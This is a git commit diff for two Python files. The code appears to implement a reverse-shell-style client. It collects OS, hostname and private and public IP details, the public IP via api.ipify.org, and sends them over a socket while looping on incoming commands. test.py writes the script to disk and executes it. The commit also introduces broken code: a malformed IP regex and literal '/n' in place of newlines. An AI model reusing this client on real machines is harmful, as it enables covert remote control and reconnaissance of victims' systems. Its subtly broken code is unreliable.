f5834dd663fb6881ca4596e20dd7b346458eef04
subhomoy-roy-choudhury <subhomoyrchoudhury@gmail.com.com>
2021-04-21 12:36:47 +0530

    sample script

--- sample.py
+++ sample.py
@@ -14,25 +14,22 @@ def info():
     ip_address = socket.gethostbyname(hostname)  # returns IPv4 address with respect to hostname
     os.system('ip addr > out.txt')
     f = open("out.txt", "r")
-    strings = re.findall(r'192.168.\d{1,3}.\d{1,3}', f.read())
+    strings = re.findall(r'192.168.\d(1, 3).\d(1, 3)', f.read())
     ip = get('https://api.ipify.org').text
 
     output1 = 'Operating System : '+str(system_data.system)
     # output1 = str(output)
     
-    with open("sample.txt","w") as f :
-        output1 = 'Operating System : '+str(system_data.system)
-        output2 = 'Machine : '+ str(system_data.machine)
-        output3 = 'Processor : '+ str(system_data.processor)
-        output4 = 'Release : '+ str(system_data.release)
-        output5 = 'Version : '+ str(system_data.version)
-        output6 = 'Hostname : ' + str(hostname)
-        output7 = 'IP Address : ' + str(ip_address)
-        output8 = 'FQDN : ' + str(fqdn)
-        output9 = 'Public IP address : '+ str(ip)
-        output10 = 'Private IP Address : ' + str(strings[-2])
-        output = output1 +'/n'+ output2 +'/n'+ output3 +'/n'+ output4 +'/n'+ output5 +'/n'+ output6 +'/n'+ output7 +'/n'+ output8 +'/n'+ output9 +'/n'+ output10
-        f.write(output)
+    output2 = 'Machine : '+ str(system_data.machine)
+    output3 = 'Processor : '+ str(system_data.processor)
+    output4 = 'Release : '+ str(system_data.release)
+    output5 = 'Version : '+ str(system_data.version)
+    output6 = 'Hostname : ' + str(hostname)
+    output7 = 'IP Address : ' + str(ip_address)
+    output8 = 'FQDN : ' + str(fqdn)
+    output9 = 'Public IP address : '+ str(ip)
+    output10 = 'Private IP Address : ' + str(strings[-2])
+    output = output1 +'/n'+ output2 +'/n'+ output3 +'/n'+ output4 +'/n'+ output5 +'/n'+ output6 +'/n'+ output7 +'/n'+ output8 +'/n'+ output9 +'/n'+ output10
     return output
 
 s = socket.socket()
@@ -53,7 +50,7 @@ while True:
         output_byte = info()
         output_str = str(output_byte)
         currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str +'\n'+ currentWD))
+        s.send(str.encode(output_str +'/n'+ currentWD))
         print(output_str)
 
     elif len(data) > 0:
@@ -66,4 +63,4 @@ while True:
 
         print(output_str)
 
-    
+        
--- test.py
+++ test.py
@@ -1,3 +1,6 @@
+import os
+num=10
+text = f'''
 import socket
 import os
 import re
@@ -20,19 +23,16 @@ def info():
     output1 = 'Operating System : '+str(system_data.system)
     # output1 = str(output)
     
-    with open("sample.txt","w") as f :
-        output1 = 'Operating System : '+str(system_data.system)
-        output2 = 'Machine : '+ str(system_data.machine)
-        output3 = 'Processor : '+ str(system_data.processor)
-        output4 = 'Release : '+ str(system_data.release)
-        output5 = 'Version : '+ str(system_data.version)
-        output6 = 'Hostname : ' + str(hostname)
-        output7 = 'IP Address : ' + str(ip_address)
-        output8 = 'FQDN : ' + str(fqdn)
-        output9 = 'Public IP address : '+ str(ip)
-        output10 = 'Private IP Address : ' + str(strings[-2])
-        output = output1 +'/n'+ output2 +'/n'+ output3 +'/n'+ output4 +'/n'+ output5 +'/n'+ output6 +'/n'+ output7 +'/n'+ output8 +'/n'+ output9 +'/n'+ output10
-        f.write(output)
+    output2 = 'Machine : '+ str(system_data.machine)
+    output3 = 'Processor : '+ str(system_data.processor)
+    output4 = 'Release : '+ str(system_data.release)
+    output5 = 'Version : '+ str(system_data.version)
+    output6 = 'Hostname : ' + str(hostname)
+    output7 = 'IP Address : ' + str(ip_address)
+    output8 = 'FQDN : ' + str(fqdn)
+    output9 = 'Public IP address : '+ str(ip)
+    output10 = 'Private IP Address : ' + str(strings[-2])
+    output = output1 +'/n'+ output2 +'/n'+ output3 +'/n'+ output4 +'/n'+ output5 +'/n'+ output6 +'/n'+ output7 +'/n'+ output8 +'/n'+ output9 +'/n'+ output10
     return output
 
 s = socket.socket()
@@ -53,7 +53,7 @@ while True:
         output_byte = info()
         output_str = str(output_byte)
         currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str +'\n'+ currentWD))
+        s.send(str.encode(output_str +'/n'+ currentWD))
         print(output_str)
 
     elif len(data) > 0:
@@ -66,4 +66,14 @@ while True:
 
         print(output_str)
 
-    
+        '''
+
+with open("sample.py","w") as f :
+    print(text.replace("/n","\n"))
+    message = text
+    # message.replace("/n","\n")
+    # print(message)
+    f.write(message)
+
+print ("Starting Execution ...")
+os.system("python sample.py")
